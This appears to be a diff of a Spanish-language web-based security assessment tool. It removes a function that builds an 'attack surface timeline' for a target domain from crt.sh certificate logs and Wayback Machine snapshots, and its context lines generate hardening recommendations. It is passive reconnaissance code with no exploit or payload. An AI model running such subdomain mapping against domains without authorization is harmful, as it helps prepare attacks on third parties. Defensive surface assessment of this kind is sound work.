+    if((d.cves&&d.cves.length||0)+(d.cveDetails&&d.cveDetails.length||0)>=10) execRecs.push({pri:'ALTA',action:'Implementar programa de patch management mensual ('+(((d.cves&&d.cves.length)||0)||(d.cveDetails&&d.cveDetails.length)||0)+' CVEs acumulados)',impact:'Acumulación crítica indica ausencia de proceso de gestión de vulnerabilidades',effort:'Proceso continuo'});
     if(d.ports&&d.ports.length>5) execRecs.push({pri:'MEDIA',action:'Auditoría de puertos expuestos — reducir superficie de ataque ('+d.ports.length+' detectados)',impact:'Cada puerto abierto innecesario es un vector potencial de ataque',effort:'1 semana'});
     if(d.subs&&d.subs.length>20) execRecs.push({pri:'MEDIA',action:'Inventario de subdominios — revisar '+d.subs.length+' activos detectados',impact:'Subdominios olvidados son vectores comunes de acceso inicial y phishing',effort:'2-3 semanas'});
       execRecs.push({pri:'BAJA',action:'Implementar cabeceras de seguridad HTTP (CSP, HSTS, X-Frame-Options, Permissions-Policy)',impact:'Mitiga XSS, clickjacking, y ataques de protocol downgrade',effort:'3-5 días'});
@@ -9542,94 +9283,7 @@ function generateTargetPDF(mode){
 // ══════════════════════════════════════════════════════════════
 //  ATTACK SURFACE TIMELINE
 // ══════════════════════════════════════════════════════════════
-async function runAttackTimeline(){
-  var domain=(document.getElementById('target-domain')||{value:''}).value.trim()
-    .replace(/^https?:\/\//,'').replace(/\/.*$/,'');
-  if(!domain){tgtOut('<span style="color:var(--red)">// Ingresa un dominio en el campo TARGET</span>\n');return;}
-  var o=document.getElementById('out-target');
-  if(o) o.innerHTML='';
-  tgtOut('<div style="font-family:var(--font);font-size:.75rem;color:var(--g);margin-bottom:6px;">⏱ ATTACK SURFACE TIMELINE — '+escH(domain)+'</div>\n','');
-  tgtOut('<span style="color:rgba(0,255,65,.4)">// Analizando evolución histórica... (20-30s)</span>\n\n','');
-  try{
-    var r=await fetch('https://crt.sh/?q=%.'+encodeURIComponent(domain)+'&output=json',
-      {signal:AbortSignal.timeout(25000)});
-    if(!r.ok) throw new Error('HTTP '+r.status);
-    var data=await r.json();
-    var subsByMonth={};
-    var allSubs={};
-    var byYear={};
-    data.forEach(function(entry){
-      var names=(entry.name_value||'').split('\n');
-      var logged=(entry.entry_timestamp||'').substring(0,7)||'unknown';
-      var year=logged.substring(0,4);
-      names.forEach(function(n){
-        n=n.trim().toLowerCase().replace(/^\*\./,'');
-        if(!n||!n.endsWith('.'+domain)) return;
-        if(!allSubs[n]){
-          allSubs[n]=logged;
-          if(!subsByMonth[logged]) subsByMonth[logged]=[];
-          subsByMonth[logged].push(n);
-          if(!byYear[year]) byYear[year]=new Set();
-          byYear[year].add(n);
-        }
-      });
-    });
-    var years=Object.keys(byYear).sort();
-    var months=Object.keys(subsByMonth).sort();
-    var total=Object.keys(allSubs).length;
-    tgtOut('<span style="color:var(--g)">// '+total+' subdominios en '+years.length+' años ('+years[0]+' — '+(years[years.length-1]||'?')+')</span>\n\n','');
-    // Bar chart by year
-    tgtOut('<span style="color:rgba(0,255,65,.4)">// Nuevos subdominios por año:</span>\n','');
-    var maxY=0;
-    years.forEach(function(y){if(byYear[y].size>maxY)maxY=byYear[y].size;});
-    years.forEach(function(y){
-      var n=byYear[y].size;
-      var b=Math.round(n/Math.max(maxY,1)*30);
-      var col=n>50?'var(--red)':n>20?'var(--amber)':'var(--g)';
-      tgtOut('  <span style="color:rgba(0,255,65,.5)">'+y+'</span>  <span style="color:'+col+'">'+
-        '\u2588'.repeat(b)+'\u2591'.repeat(30-b)+'</span>  <span style="color:'+col+'">'+n+'</span>\n','');
-    });
-    tgtOut('\n','');
-    // Recent subs
-    var recent=months.slice(-6).reverse();
-    if(recent.length){
-      tgtOut('<span style="color:rgba(0,255,65,.4)">// Últimos 6 meses:</span>\n','');
-      recent.forEach(function(m){
-        var ss=subsByMonth[m]||[];
-        if(!ss.length) return;
-        tgtOut('  <span style="color:var(--amber)">'+escH(m)+'</span> <span style="color:rgba(0,255,65,.4)">('+ss.length+' nuevos)</span>\n','');
-        ss.slice(0,4).forEach(function(s){tgtOut('    <span style="color:rgba(0,255,65,.6)">'+escH(s)+'</span>\n','');});
-        if(ss.length>4)tgtOut('    <span style="color:rgba(0,255,65,.3)">... y '+(ss.length-4)+' más</span>\n','');
-      });
-      tgtOut('\n','');
-    }
-    // Wayback spot check
-    tgtOut('<span style="color:rgba(0,255,65,.4)">// Wayback Machine — primer snapshot:</span>\n','');
-    var spotSubs=Object.keys(allSubs).slice(0,5);
-    for(var i=0;i<spotSubs.length;i++){
-      try{
-        var wb=await fetch('https://archive.org/wayback/available?url='+encodeURIComponent(spotSubs[i]),
-          {signal:AbortSignal.timeout(5000)});
-        if(wb.ok){
-          var wbd=await wb.json();
-          var snap=wbd.archived_snapshots&&wbd.archived_snapshots.closest;
-          if(snap&&snap.available){
-            var wbDate=snap.timestamp.substring(0,8).replace(/(\d{4})(\d{2})(\d{2})/,'$1-$2-$3');
-            tgtOut('  <span style="color:var(--cyan)">'+escH(spotSubs[i])+'</span> '+
-              '<span style="color:rgba(0,255,65,.4)">'+escH(wbDate)+'</span>  '+
-              '<a href="'+escH(snap.url)+'" target="_blank" style="color:rgba(0,255,65,.35);font-size:.6rem;">↗</a>\n','');
-          } else {
-            tgtOut('  <span style="color:rgba(0,255,65,.35)">'+escH(spotSubs[i])+'</span> <span style="color:rgba(0,255,65,.2)">sin snapshot</span>\n','');
-          }
-        }
-        await new Promise(function(r){setTimeout(r,200);});
-      }catch(e){}
-    }
-    tgtOut('\n<span style="color:var(--g)">// ═══ TIMELINE COMPLETO ══ Y000! ═══</span>\n','');
-  }catch(e){
-    tgtOut('<span style="color:var(--red)">// Error: '+escH(e.message)+'</span>\n','');
-  }
-}
+
 
 // ══════════════════════════════════════════════════════════════
 //  WAF FINGERPRINT DETECTOR
